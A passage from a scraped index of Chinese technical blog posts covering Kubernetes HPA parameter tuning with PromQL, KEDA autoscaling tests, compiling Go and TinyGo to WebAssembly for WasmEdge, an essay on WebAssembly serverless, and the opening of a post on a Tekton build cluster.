策略，通过累计算法，可以应对这种瞬时的 CPU 需求。\nclamp_min(max(quantile_over_time(0.99, irate(container_cpu_usage_seconds_total{cluster=\u0026#34;$cluster\u0026#34;, namespace=\u0026#34;$namespace\u0026#34;, deployment=\u0026#34;$deployment\u0026#34;}[2m])[1w:2m])) + quantile_over_time(0.99, (sum(irate(container_cpu_cfs_throttled_seconds_total{cluster=\u0026#34;$cluster\u0026#34;, name=~\u0026#34;^k8s_.*\u0026#34;, namespace=~\u0026#34;$namespace\u0026#34;, deployment=~\u0026#34;$deployment\u0026#34;}[10s])))[1w]), 0.52) Limit = 99 百分位 CPU 使用核数 + 99 百分位 CPU 限流核数，同时不小于 0.52 核。\n如果不升级内核，99 百分位 CPU 限流核数会很高，需要适当调整。\nMemory 内存超了会被内核 OOM，你会发现内存的监控值始终不会超过 Limit。因此 Limit 应该超过 Request，但又不会触发 OOM 为宜。\nquantile_over_time(0.995, container_memory_working_set_bytes{cluster=\u0026#34;$cluster\u0026#34;, namespace=\u0026#34;$namespace\u0026#34;, deployment=\u0026#34;$deployment\u0026#34;}[1w:5m]) 可以以 99.5 百分位的内存作为 Limit 起始值，逐步增加，直到不再触发 OOM。\n4. 调试前的准备工作 了解了业务背景、相关的要点，在正式配置之前还需要进行一些预防措施，避免事故。\n4.1 业务 SLO 告警 紧盯业务的关键 SLI 是能够大胆调试的关键，如果不能保障 SLA 一切的优化都是徒劳。\n这里选取的是成功率、堆积量 A\\B 作为核心指标。\n成功率 \u0026gt; 99%\n这一成功率要求，也影响了很多参数百分位的设置。\n堆积量 A \u0026lt; 1000\n堆积量 B \u0026lt; 1000\n建议以最能体现使用方体验的指标作为 SLI，而不是以研发、运维的视角来定义 SLI。\n4.2 集群应用 Pod 相关告警 由于调试 HPA 会涉及 Pod 的创建，为了避免扩容失败，需要对 Pod 的相关指标进行监控。\nPod 未就绪 sum by (cluster, app, pod)(kube_pod_status_ready{condition=\u0026#39;false\u0026#39;,exported_namespace=\u0026#39;default\u0026#39;}) Pod 等待调度 sum by (cluster, app, pod)(kube_pod_status_phase{phase=\u0026#39;Pending\u0026#39;,exported_namespace=\u0026#39;default\u0026#39;}) Pod OOM sum by (namespace,pod) ((kube_pod_container_status_restarts_total{exported_namespace=\u0026#34;default\u0026#34;} - kube_pod_container_status_restarts_total{exported_namespace=\u0026#34;default\u0026#34;} offset 10m \u0026gt;= 1) and ignoring (reason) min_over_time(kube_pod_container_status_last_terminated_reason{exported_namespace=\u0026#34;default\u0026#34;,reason=\u0026#39;OOMKilled\u0026#39;}[10m]) == 1) Pod 限流 sum (rate (container_cpu_cfs_throttled_seconds_total{namespace=\u0026#34;default\u0026#34;,name=~\u0026#34;^k8s_.*\u0026#34;}[5m])) by (pod) 4.2 应用分级 线上的应用面对潮汐流量，在资源使用上总会有波动。一旦这种波动超过了节点的承载能力，就会导致节点驱逐应用，影响业务的稳定性。\n而 Kubernetes 驱逐的策略是根据 QoS 类型来决定的，QoS 类型分为三种：\nBestEffort：没有设置 Request 或 Limit，当节点资源不足时，优先驱逐 Burstable：Request 和 Limit 不相等，当节点资源不足时，可以驱逐 Guaranteed：Request 和 Limit 相等时，当节点资源不足时，尽量不驱逐 只用区分两种类型就可以，重点业务应用 Request、Limit 相等，非重点业务应用 Request、Limit 不相等。\n4.3 开启 Pod 调度的亲和性 对于副本较多，普通应用可以开启软亲和性，尽量避免在同一个机器上调度。\n1 2 3 4 5 6 7 8 9 10 11 12 affinity: podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 1 podAffinityTerm: labelSelector: matchExpressions: - key: app operator: In values: - myapp topologyKey: kubernetes.io/hostname 对于副本较少，重点应用可以开启硬亲和性，强制分散到不同机器上。\n1 2 3 4 5 6 7 8 9 10 affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchExpressions: - key: app operator: In values: - myapp topologyKey: kubernetes.io/hostname 对于副本较多的应用，最好使用软亲和性，避免 Cluster Autoscaler 不断扩容增加额外的成本。\n5. 开始配置 HPA 5.1 新建 HPA 对象 如果有一个 Deployment 部署的应用 example，只需要创建一个 HPA 对象，指定 Deployment 的名称即可。\n应用以下 yaml 对象\n1 2 3 4 5 6 7 8 9 10 11 12 13 apiVersion: autoscaling/v1 kind: HorizontalPodAutoscaler metadata: name: example namespace: default spec: maxReplicas: 5 minReplicas: 2 scaleTargetRef: apiVersion: apps/v1 kind: Deployment name: example targetCPUUtilizationPercentage: 60 或者执行命令\n1 kubectl autoscale deployment example --cpu-percent=60 --min=2 --max=5 创建 HPA 对象，它的目标是 example Deployment，最大副本数 5，最小副本数 2，目标 CPU 使用率 60%。当 Pod 平均 CPU 使用率超过 60% 时，HPA 会增加副本数量。\n5.2 HPA 参数 由于我主要使用的是 HPA v1 cpu 指标，这里只介绍 v1 的几个主要参数。\n副本数量下限 生产环境最少需要 2 个 Pod，避免单点故障。重点应用，最少需要 3 个 Pod。\n副本数量上限 Pod 的数量会随着负载的上升，不断增加，按需使用，因此上限应该尽量大一些。如果平时副本 2-3 个，就给上限为 5。如果平时副本数量为 10-20 个，就给上限为 30。\n上限最好设置得比平时多一些，同时设置为 5 的倍数为宜，方便识别扩容数量达到 HPA 上限之后，继续增加。\nCPU 使用率 CPU 使用率设置得越低，扩容时就越灵敏；设置得越高，资源的利用率就越低。通常可以根据应用的负载情况，设置为 50%-70%。\n设置的策略是，先设置为 50%，等稳定之后，再逐步增加 5%。\n6. 总结 本篇主要是记录了在给 60 个应用设置 HPA 的之后，遇到的问题和一些思考。主要内容如下:\nRequest 在集群调度、HPA 中发挥了很重要的作用 通过 PromeQL 设置应用的 Request 和 Limit 调试 HPA 之前应该配置一些告警，保障服务的 SLA 配置 HPA 及相关参数 给不同应用设置 Request、Limit、HPA 副本上限、HAP 副本下限、HPA CPU 使用率，是一件繁琐的事情，建议先绘制一个 Grafana 计算面板，可以实时计算调试。类似下图:\n最终效果如下:\n资源的请求量会随着使用量波动，而请求量又直接影响到公有云的机器使用数量。如下图是线上 Usage/ Request 的情况，也是我不断优化 HPA 相关参数的指引指标。\n从云厂控制台的账单来看，HPA 相较于没有弹性，成本降低了 50%；在之前的实践中，CronHPA 相较于没有弹性，成本降低了 30%。\n另外可以考虑的是，将长期占用的弹性公有云机器转移到私有云，或者采用公有云包年的结算方式，因为云厂的按需付费弹性主机价格比较高。\n7. 参考 https://www.infoq.cn/article/y2SeMvaJjgXJ9mBg9P00 https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale/ ","description":"","id":110,"section":"post","tags":["博文","Kubernetes","HPA","Pod"],"title":"如何给 Kubernetes 应用设置 HPA 以及相关参数","uri":"https://www.chenshaowen.com/blog/how-to-set-hpa-for-kubernetes-app.html"},{"content":"1. HPA VS KEDA HPA 也实现了:\n自定义指标的弹性 Scale to Zero 这些与 KEDA 相比较，并不算劣势了。\n真正的差别在于 HPA 只能利用监控数据进行伸缩，而 KEDA 可以利用更多数据来源进行伸缩，比如队列消息、数据库、Redis 等，当然也包括监控数据。\n从 Kubernetes-based Event Driven Autoscaler (KEDA) 项目的名字就可以看出，KEDA 是一个基于事件的自动伸缩器，它强调的是事件驱动，而不是监控驱动。\n另外，KEDA 与 HPA 也并不是对立的，在使用 KEDA 时，也会借助 HPA 的能力，创建 HPA 对象。\n2. 部署 KEDA KEDA Version Supported Kubernetes version 2.10 v1.24 - v1.26 2.8 v1.17 - v1.25 由于 KEDA 社区的镜像托管在 ghcr.io，因此转存了一份到 docker.io，方便在国内使用。参考[1]\n测试的集群版本是 v1.21.4，安装 KEDA 2.8 。\n1 kubectl apply -f https://raw.githubusercontent.com/shaowenchen/hubimage/master/keda/v2.8.2-keda.yaml 查看 Pod 是否正常\n1 2 3 4 5 kubectl -n keda get pod NAME READY STATUS RESTARTS AGE keda-metrics-apiserver-7d8df95dd-nqfbg 1/1 Running 0 20d keda-operator-59878677c4-2rqjm 1/1 Running 0 20d keda-operator 负责处理 KEDA 内置对象、HPA 对象；keda-metrics-apiserver 提供给 HPA 的 external 类型指标，借助 HPA 实现弹性。\n3. 配置 ScaledObject 创建应用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 apiVersion: apps/v1 kind: Deployment metadata: name: nginx-deployment namespace: default labels: app: nginx spec: replicas: 5 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - name: nginx-vts image: shaowenchen/demo-nginx-vts:latest ports: - containerPort: 80 imagePullPolicy: Always - name: nginx-vts-exporter image: shaowenchen/demo-nginx-vts-exporter:latest ports: - containerPort: 9913 创建 Service，并暴露在 30000 端口上 在 30001 端口上暴露 metrics，是为了方便测试，如果不需要，可以不暴露。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 apiVersion: v1 kind: Service metadata: labels: app: nginx name: nginx-svc namespace: default annotations: prometheus.io/scrape: \u0026#34;true\u0026#34; prometheus.io/path: \u0026#34;/metrics\u0026#34; prometheus.io/port: \u0026#34;9913\u0026#34; spec: ports: - name: nginx nodePort: 30000 port: 80 protocol: TCP targetPort: 80 - name: metrics nodePort: 30001 port: 9913 protocol: TCP targetPort: 9913 selector: app: nginx type: NodePort 创建 ScaledObject 对象 ScaledObject 对象是 KEDA 的核心对象，它定义了伸缩的目标对象、触发器、伸缩策略等。ScaledJob 与 ScaledObject 类似，只是它的目标对象是 Job。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 apiVersion: keda.sh/v1alpha1 kind: ScaledObject metadata: name: nginx-deployment-scaledobject namespace: default spec: scaleTargetRef: name: nginx-deployment pollingInterval: 15 cooldownPeriod: 30 minReplicaCount: 0 maxReplicaCount: 20 triggers: - type: prometheus metadata: serverAddress: http://prometheus-server.monitor.svc:80 metricName: nginx_server_requests threshold: \u0026#39;5\u0026#39; query: sum (irate(nginx_server_requests{code=\u0026#34;total\u0026#34;, host=\u0026#34;*\u0026#34;}[1m]))/60 其中:\nscaleTargetRef 指定了伸缩的目标对象 pollingInterval 指定了触发器的轮询间隔，Prometheus 指标采样间隔为 15s，因此这里设置为 15s cooldownPeriod 指的是副本从 1 变为 0 的冷却时间，KEDA 并不仅仅针对常驻服务，Scale to Zero 也是 KEDA 的特性之一 minReplicaCount 最小副本数 maxReplicaCount 最大副本数 triggers 指定了触发伸缩的数据来源，这里使用的是 Prometheus 触发器，它的参数有:\nserverAddress: Prometheus 服务地址 metricName: 指标名称 threshold: 阈值 query: Prometheus 查询语句 Pod 的副本数 = 当前 Pod 副本数 * （query/threshold）。这里的意思是，按照每个 Pod 处理 5 QPS，设置 Pod 的数量。\n4. 测试应用伸缩能力 4.1 准备监控数据 监控先行。先看得到监控数据，再进行压测。\nQPS 从下面监控值可以看到，QPS 的统计会有一定的误差。\nsum (irate(nginx_server_requests{code=\u0026#34;total\u0026#34;, host=\u0026#34;*\u0026#34;}[1m]))/60 Pod Num max (sum by(instance)(kube_deployment_status_replicas{deployment=~\u0026#34;nginx-deployment\u0026#34;})) 4.2 压测应用 这里使用的是 wrk 工具对应用进行压测。测试命令如下:\n1 wrk -t1 -c10 -d120s http://0.0.0.0:30000/ 这里的 -t1 -c10 -d120s 参数的意思是，使用 1 个线程，10 个连接，持续 120s。\n以下为测试数据:\nWRK QPS VTS QPS Pod Num 10 8.9 2 20 16.8 4 40 35.5 7 80 69.6 14 160 133 20 VTS QPS / Pod Num 约等于 5，与预期一致。\n由于设置了 maxReplicaCount 为 20，VTS QPS 达到 133 时，Pod 副本数为 20 时达到上限。\n缩容 Pod，但 Pod 副本数没有降为 0\n这里有几个问题:\n为什么缩容 Pod 速度很慢 为什么 Pod 副本数没有降为 0 请看下面的优化。\n5. 优化配置 5.1 快速扩容、延时缩容 在指标达到阈值时，我们希望能够快速加副本，而不用长时间等待。\n在指标低于阈值时，我们希望能够延缓缩容副本，避免因指标抖动，导致副本同步抖动。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 apiVersion: keda.sh/v1alpha1 kind: ScaledObject metadata: name: nginx-deployment-scaledobject namespace: default spec: scaleTargetRef: name: nginx-deployment pollingInterval: 15 cooldownPeriod: 30 minReplicaCount: 0 maxReplicaCount: 20 advanced: horizontalPodAutoscalerConfig: behavior: scaleUp: stabilizationWindowSeconds: 15 policies: - type: Pods value: 5 periodSeconds: 15 scaleDown: stabilizationWindowSeconds: 60 policies: - type: Pods value: 5 periodSeconds: 15 triggers: - type: prometheus metadata: serverAddress: http://prometheus-server.monitor.svc:80 metricName: nginx_server_requests threshold: \u0026#39;5\u0026#39; query: sum (irate(nginx_server_requests{code=\u0026#34;total\u0026#34;, host=\u0026#34;*\u0026#34;}[1m]))/60 在 advanced 参数中有:\nstabilizationWindowSeconds: 指标稳定时间，也就是指标达到阈值后，需要持续多久才会触发伸缩 scaleUp: 扩容策略 scaleDown: 缩容策略 policies: 策略列表，periodSeconds 指的是每隔多久执行一次策略，value 指的是每次执行策略时，增加或减少的 Pod 数量 这里的意思是: 扩容时，持续 15s 就会触发伸缩，每隔 15s 扩容 5 个 Pod；缩容时，持续 60s 才会触发伸缩，每隔 15s 缩容 5 个 Pod。\n最终的效果如下:\n扩容时，指标与 Pod 数量同步增加；缩容时，指标先下降，然后 Pod 数量才下降。\n5.2 Scale to Zero 虽然我们设置了 minReplicaCount 为 0，但从监控数据看到 Pod 副本数并没有降为 0，\n这其实就涉及到指标可能的误差。监控系统的可用性优先级是高于一致性、准确性的，是容忍一定的误差的。\n如下图，我们可以看到在没有请求时，指标也不是 0，才导致 Pod 副本数没有降为 0。\n解决办法很简单，就是在指标中减去误差值即可。\nsum (irate(nginx_server_requests{code=\u0026#34;total\u0026#34;, host=\u0026#34;*\u0026#34;}[1m]))/60 - 0.1 指标查询的结果为 0 或者负数时，KEDA 会将 Pod 副本数设置为 minReplicaCount 值。\n6. 总结 最近在生产环境，有一批应用需要根据自定义的指标对 Kubernetes 应用的副本数进行伸缩，因此学习了一下 KEDA 。本文主要是记录学习和测试验证 KEDA 的过程。主要内容如下:\nKEDA 与 HPA 比较，支持更多的触发来源 通过 Advanced 参数，可以对伸缩策略进行优化，实现快速扩容、延时缩容 Scale to Zero 时，需要考虑指标的误差 另外，KEDA 会自动管理 Deployment 副本数，人工设置的值会被覆盖。并且 Deployment 的 resourceVersion 值也会发生变化。如果在伸缩期间，修改 Deployment 镜像、环境变量等参数，可能会因为 resourceVersion 不一致，导致变更失败。\n7. 参考 https://github.com/shaowenchen/hubimage ","description":"","id":111,"section":"post","tags":["博文","Kubernetes","KEDA","集群弹性"],"title":"使用 KEDA 自动伸缩 Kubernetes 应用","uri":"https://www.chenshaowen.com/blog/autoscale-kubernetes-applications-with-keda.html"},{"content":"1. WebAssembly 简介 跨平台性，可以在任何支持 WebAssembly 的平台上运行，包括 Web 浏览器、服务器、移动设备等\n高性能，采用了一种紧凑的二进制格式，可以在浏览器中快速加载和解析，从而提高应用程序的性能\n安全性，采用了一种沙箱模型，可以隔离运行在其中的代码，从而保护系统免受恶意代码的攻击\n可移植性，WebAssembly 的代码可以通过编译器从不同的编程语言中生成，因此可以轻松地将现有的代码转换为 WebAssembly 格式\n可扩展性，WebAssembly 支持向后兼容的版本控制，并允许在未来添加新的指令和功能，从而使其具有更好的扩展性\n2. 落地案例 autocad https://web.autocad.com/\n在线协同设计工具 figma https://www.figma.com/\n谷歌地球 https://earth.google.com/web/\nweb 版 photoshop https://photoshop.adobe.com/\nweb 版 libreoffice https://lab.allotropia.de/wasm/\nWebAssembly 实现的虚拟机 v86 https://github.com/copy/v86\n在线运行 Go https://goscript.dev/\n在线运行 Python https://pyscript.net/\n更多使用 WebAssembly 的案例参考 https://madewithwebassembly.com/\n3. 常见 WebAssembly 非前端运行时 WebAssembly 运行时是 WebAssembly 代码的运行环境，它负责加载 WebAssembly 模块、创建 WebAssembly 实例、执行 WebAssembly 代码。\nC/C++ 语言实现的 - WasmEdge、wasm3 Rust 语言实现的 - wasmer、wasmtime Go 语言实现的 - WaZero 目前的主流浏览器、高版本的 Nodejs 都是支持 wasm 的。\n4. 安装 WasmEdge 由于 Docker 新版本支持 WasmEdge，我在本地也选择使用 WasmEdge 作为 WebAssembly 运行时，以便于容器内保持一致。\n下载 Wasmedge 二进制文件 前往 https://github.com/WasmEdge/WasmEdge/releases 下载对应平台的二进制文件。\n1 wget https://github.com/WasmEdge/WasmEdge/releases/download/0.12.0/WasmEdge-0.12.0-darwin_x86_64.tar.gz 解压 Wasmedge 并安装 1 2 tar -zxvf WasmEdge-0.12.0-darwin_x86_64.tar.gz -C /Users/shaowenchen --strip-components=1 export PATH=$PATH:/Users/shaowenchen/bin 如果需要拷贝到其他目录下，注意保持 bin、include、lib 三个目录的相对位置，否则会出现以下错误:\n1 2 3 dyld: Library not loaded: @rpath/libwasmedge.0.dylib Referenced from: /Users/shaowenchen/bin/wasmedge Reason: image not found 查看 Wasmedge 版本 1 2 3 wasmedge --version wasmedge version 0.12.0 5. 使用 TinyGo 编译 WebAssembly 程序 5.1 使用 TinyGo 的优劣 使用 TinyGo 的好处 TinyGo 是 Go 的子集，可以使用 Go 语言编写 WebAssembly 程序。\n可以直接在 WasmEdge 上运行，无需 JavaScript 环境。\nwasm 文件足够小，几十 KB。\n使用 TinyGo 的缺点 TinyGo 有些库不能用，比如 net/http 等，具体可参考 https://tinygo.org/docs/reference/lang-support/stdlib/ 。\nTinyGo 不支持全部 Go 语言特性，比如 Cgo 等，具体可参考 https://tinygo.org/docs/reference/lang-support/ 。\n5.1 Hello, World! 新建 main.go 文件 1 2 3 4 5 package main func main() { println(\u0026#34;Hello, World! by TinyGo\u0026#34;) } 编译代码 1 tinygo build -o ./build/main.wasm -target=wasm 使用 WasmEdge 运行 1 2 3 wasmedge ./build/main.wasm Hello, World! by TinyGo 新建 Dockerfile 文件 1 2 3 FROM scratch ADD ./build/main.wasm /build/main.wasm ENTRYPOINT [\u0026#34;/build/main.wasm\u0026#34;] 编译容器镜像 1 docker build -t shaowenchen/wasm-hello-world:tinygo . 运行容器镜像 1 2 3 4 docker run --rm --runtime=io.containerd.wasmedge.v1 \\ shaowenchen/wasm-hello-world:tinygo Hello, World! by TinyGo 6. 使用 Go 编译 WebAssembly 程序 6.1 使用 Go 的优劣 使用 Go 的好处 可以使用 syscall/js 包与 JavaScript 进行交互。\n可以使用 Go 语言的全部特性和包。\n未来，WebAssembly 运行时支持 GC 后，程序体积、性能可能会得到改善。\n使用 Go 的缺点 默认需要 JavaScript 环境支持。\n体积较大，几 MB、甚至几十 MB。不过，很多祖传项目编译出来也是几十、上百 MB。\n6.2 Hello, World! 新建 main.go 文件 1 2 3 4 5 package main func main() { println(\u0026#34;Hello, World! by Go 1.19\u0026#34;) } 编译代码 1 GOOS=js GOARCH=wasm go build -o ./dist/main.wasm 使用 node 运行 注意，nodejs 需要 12 及以上才行。\n1 2 3 4 cp $(shell go env GOROOT)/misc/wasm/wasm_exec_node.js ./dist/ node ./dist/wasm_exec_node.js ./dist/main.wasm Hello, World! by Go 1.19 新建 Dockerfile 文件 1 2 3 FROM node:12-alpine ADD ./dist /dist ENTRYPOINT [\u0026#34;node\u0026#34;,\u0026#34;/dist/wasm_exec_node.js\u0026#34;, \u0026#34;/dist/main.wasm\u0026#34;] 编译容器镜像 1 docker build -t shaowenchen/wasm-hello-world:go . 运行容器镜像 1 2 3 docker run --rm shaowenchen/wasm-hello-world:go Hello, World! by Go 1.19 6.3 使用 syscall/js 实现 Go 与 JavaScript 数据的交互 Go 语言提供了 syscall/js 包，可以用于与 JavaScript 进行交互。\n在 Go 中调用 JavaScript 函数 通过 syscall/js 包提供的 Global() 函数获取宿主 JavaScript 环境的对象。\n1 js.Global().Get(\u0026#34;console\u0026#34;).Get(\u0026#34;log\u0026#34;).Invoke(\u0026#34;Hello, World!\u0026#34;) 等价于\n1 console.log(\u0026#34;Hello, World!\u0026#34;) 在 JavaScript 中调用 Go 函数 1 2 3 4 5 js.Global().Set(\u0026#34;myfunc\u0026#34;, js.FuncOf(myfunc)) func myfunc(this js.Value, args []js.Value) interface{} { return nil } js.Global().Set 将对象注册到 JavaScript 环境中，在浏览器前端可以直接调用 myfunc 函数。\n重写 hello world，在浏览器页面执行 wasm 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 package main import ( \u0026#34;syscall/js\u0026#34; ) func main() { // 调用前端的函数，在控制台打印 js.Global().Get(\u0026#34;console\u0026#34;).Get(\u0026#34;log\u0026#34;).Invoke(\u0026#34;Hello, World by Go\u0026#34;) // 找到 ID 为 hello 的元素，插入文本 js.Global().Get(\u0026#34;document\u0026#34;).Call(\u0026#34;getElementById\u0026#34;, \u0026#34;hello\u0026#34;).Set(\u0026#34;innerHTML\u0026#34;, \u0026#34;Hello, World! by Go\u0026#34;) // 将 Go 函数，注册到前端 js.Global().Set(\u0026#34;myfunc\u0026#34;, js.FuncOf(myfunc)) // 不立马退出，否则会报错 \u0026lt;-make(chan bool) } func myfunc(this js.Value, args []js.Value) interface{} { println(\u0026#34;myfunc called\u0026#34;) // 获取函数参数 myfunc_arg0 := args[0].String() // 在前端 window 对象中设置变量 js.Global().Set(\u0026#34;myfunc_arg0\u0026#34;, myfunc_arg0) js.Global().Get(\u0026#34;console\u0026#34;).Get(\u0026#34;log\u0026#34;).Invoke(myfunc_arg0) return nil } 拷贝 wasm_exec.js wasm_exec.html 文件 Go 编译器自带有一个样例。\n1 2 cp $(shell go env GOROOT)/misc/wasm/wasm_exec.js ./dist/ cp $(shell go env GOROOT)/misc/wasm/wasm_exec.html ./dist/ wasm_exec.js 的作用是在浏览器中加载执行 wasm，wasm_exec.html 是一个实例。\n修改 wasm_exec.html 为了演示 Go 与 JavaScript 的数据交互能力，这里稍微修改一下样例。\n1 WebAssembly.instantiateStreaming(fetch(\u0026#34;main.wasm\u0026#34;)... 这里的 fetch 应该是编译出来的 wasm 文件，默认是 test.wasm，根据需要修改为 main.wasm。\n1 2 3 4 5 6 7 \u0026lt;/script\u0026gt; function callGo() { myfunc(\u0026#34;abc\u0026#34;); } \u0026lt;/script\u0026gt; \u0026lt;button onClick=\u0026#34;callGo();\u0026#34; id=\u0026#34;callGoButton\u0026#34; \u0026gt;callGoButton\u0026lt;/button\u0026gt; \u0026lt;div id=\u0026#34;hello\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; 这里新增一个按钮，用于调用 Go 函数 myfunc。\n查看效果 本地启一个 http 服务\n1 2 3 python3 -m http.server --directory ./dist Serving HTTP on :: port 8000 (http://[::]:8000/) ... 访问 http://localhost:8000/wasm_exec.html 页面\n点击 Run 按钮，Go 调用前端对象，输出文本、在页面插入文本。\n点击 callGoButton，前端调用 Go 函数。\n在控制台访问 windows.myfunc_arg0，获取 Go 在前端对象中设置的值。\n7. 总结 本篇主要是在尝试 Go 编写 WebAssembly 的一些方式。如果不进行额外的配置，目前比较快捷的两种方式是:\n使用 TingyGo 编写，直接在 WasmEdge 上运行 使用 Go 编写，需要借助 JS 加载，在 Nodejs 上运行 另外，还提供了 Go 1.19 编写 WebAssembly 与 JavaScript 函数、数据交互的一个示例。\n文中相关代码都在 https://github.com/shaowenchen/demo/tree/master/wasm-hello-world 。\n8. 参考 https://chai2010.cn/post/2022/wasm2022/ https://github.com/wasmerio/wasmer https://github.com/bytecodealliance/wasmtime https://github.com/wasm3/wasm3 ","description":"","id":112,"section":"post","tags":["博文","Go","WebAssembly"],"title":"使用 Go 编写 WebAssembly 程序","uri":"https://www.chenshaowen.com/blog/get-webassembly-programs-using-go.html"},{"content":"1. 基于容器的 Serverless 无法支撑下一代应用的形态 如上图，我们正经历着一次运行时态的变革。\n从裸金属机到虚拟机，应用不在受限于本地服务器的数量、机房稳定性，具有更好的弹性和可用性。\n从虚拟机到容器，应用不再受限于操作系统、配置漂移，具有更好的可移植性和可扩展性。\n下一个运行时态是什么？很多文章说是 Serverless，但是 Serverless 本身并不是一个运行时态，而是一种运行时态的使用方式，是一种软件架构。下面是一个典型的 Serverless 系统流量图：\nContainer Serverless 接收到流量之后，分为两种情况：\nActive，已经有 Ready 的容器，直接转发流量到容器 Inactive，没有 Ready 的容器，需要先将流量转发到 Activator，Activator 会冷启动一个容器，然后将流量转发到容器 这种方式与 Kubernetes 的 Pod、Service、Ingress 的流量转发方式是一致的，只是多了一个 Activator 承载冷启动流量的概念。\n至于其弹性，也是借助了 Kubernetes 的能力，再辅助一些 HPA、KPA、KEDA 的弹性策略。\nKubernetes 有三种使用形态：\n全托管，master、worker 全都交给厂商 半托管，master 交给厂商，worker 自己维护 自建，基于 IaaS 自己搭建 Kubernetes 集群 利用全托管的 Kubernetes，例如 EKS，很容易实现 Serverless 的弹性能力。\n这种形态的 Serverless 并不具备革命性，只是一种使用方式的变化。\n另外一种就是 FaaS 形态的 Serverless，关注的粒度是函数，而不是容器，通常还需要外部的 BaaS 服务来支撑其状态存储。\n如上图，有两种形态的 FaaS Serverless：\nContainer Native Runtime 容器形态的 FaaS 会借助 Kubernetes 的能力，而 Native Runtime 的 FaaS 支持的语言有限，一般是 TypeScript、JavaScript、Python 等解释型语言。\n更为关键的是 FaaS 形态的 Serverless 定制性太强。不是与厂商的 FaaS 服务绑定 Vendor Lock-in，就是与平台的应用 Framework 绑定，只能用指定的语言、框架、组件，局限性很大。在某些细分的领域，可能会有一些机会，比如离线计算、数据处理、数据分析等。\n总的来说，Container Serverless 不具颠覆性，FaaS Serverless 不具通用性，不足以支撑下一次的应用形态变革。\n2. 未来王者非 WebAssembly 莫属 WebAssembly 是一种新的运行时态，它是一种二进制格式，可以在浏览器、Node.js、Deno、WASI 等环境中运行。\n实际上，只要实现了 WebAssembly 的运行时、系统接口，就可以在其上运行 WebAssembly。如果操作系统集成了 WebAssembly 的运行时，那么就可以在操作系统上运行 WebAssembly。WebAssembly 有机会成为 Container 之后新的交付格式。\n如上图是 WebAssembly Serverless 的流量图。WebAssembly Serverless 没有 Scale To Zero 和 冷启动的问题，在成本和性能上都有很大的优势。\n借助于 WAGI 能够将 HTTP 请求转换为 WebAssembly 的调用。此时的运行时，不再直接是 Container，而是 WebAssembly Runtime。至于底层是 Container、VM、Metal 已经无关紧要，WebAssembly 已经摆脱了这些限制，甚至可以是一个 IoT 设备。只需要这些设备能组成一个巨大的计算、存储池即可。\nWebAssembly Serverless 不会有 Vendor Lock-in，任何语言编写的代码只要编译为 WebAssembly 都可以运行在 WebAssembly Serverless 上。\n3. 前端后端化、后端轻量化 当前的主流算力集中在后端，前端是一个简单的 UI 层，前端的算力很少，只是简单的渲染、事件处理等。\n但近年有一些变化:\n前端的算力越来越强，手机、电脑的性能越来越好 前端工程能力越来越强，能够替代后端完成很多工作，例如文档渲染（WPS 在研）、图像处理（PS、CAD）、视频处理（B站视频上传）等 后端的算力成本越来越高，需要更多的机器 后端人力很贵，后端的薪资普遍比前端高很多 因此我绘制了下图:\n计算、存储下推到前端，这里的前端包括 IoT、手机、电脑、浏览器等贴近用户的终端。后端的趋势是轻量化，仅提供一些基础 BaaS 服务即可。\n这与 Serverless = FaaS + BaaS 的思路是一致的，但 FaaS 在前端，BaaS 在后端。也就是我说的前端后端化，后端轻量化。\n前端开始变得厚重，提供运行算力；后端轻量化，只提供基础服务，甚至只是静态文件的分发能力。\n如上图，后端提供的只是一个访问入口，前端加载完成，下载好 WebAssembly 之后，就与后端无关了。甚至可以不用单独开发后端，直接利用 CDN 网络即可。\n4. 分布式应用会更加容易开发 前面说到下一代应用的形态，那么下一代的应用到底是什么形态呢？分布式应用\n在区块链领域有一个很好的例子，就是 DApp 应用。DApp 有两个特点:\n去中心化 分布式 去中心化是指没有中心化的服务器，分布式是指应用的数据分布在多个节点上。\n当前网络世界最大的问题就是中心化。互联网上的流量、关注度、数据都集中在少数几家公司，财富也随之集中在少数几个人手里。这是很多矛盾的来源。\n分布式应用的出现，可以解决这些问题。\n如上图，每个设备既是消费者，也是生产者，每个设备都可以提供算力、存储、网络，也可以消费算力、存储、网络。\n此时的数据才是用户自己的，而不是被中心化的服务器所控制。\n而足够这样多的节点，就可以组成一个全新的分布式网络，基于此建造的应用才是面向未来的应用。\n","description":"","id":113,"section":"post","tags":["WebAssembly","Serverless","Kubernetes","应用"],"title":"WebAssembly Serverless 飞入寻常百姓家","uri":"https://www.chenshaowen.com/blog/webassembly-serverless-will-be-a-common-arch-in-the-future.html"},{"content":"1. 受限的构建环境无法满足构建需求 Tekton 是基于 Kubernetes 集群的 CICD 引擎，相较于 Jenkins 更加云原生。说人话就是，更好开发插件、更好扩容、更好可观测性、更好玩儿。\n由于代码仅能落盘公司内网，导致构建集群仅能部署于办公内网。这导致了很多受限：\n硬件资源，没有弹性扩容能力 网络受限，访问 github.com、docker.io、dl-cdn.alpinelinux.org 很慢 可靠性受限，机房稳定环境得不到保障、硬件故障率高 运维受限，维护系统必须先接入公司内网 但这些都是 CICD 研发的事情，没人会关注，我只能默默承受，想办法解决，谁让我是个打工人。\n直到忍无可忍的业务研发，开始公开喷 \u0026ldquo;为什么 CDN 上传任务这么慢，以前不是这样的\u0026rdquo; 。那是因为，以前我没入职，我来了早就慢下来了。\n没办法，业务研发是构建系统的用户，作为平台开发者只能再想想办法，就调研了一个云连接的方案。每个月 1w 人民币，可以接入华为云的海外 VPN 专线，直连海外。\n但花钱的事儿，业务怎么肯干？程序员的事，他们怎么会愿意花钱？\n2. 跨区域的 Kubernetes 构建集群 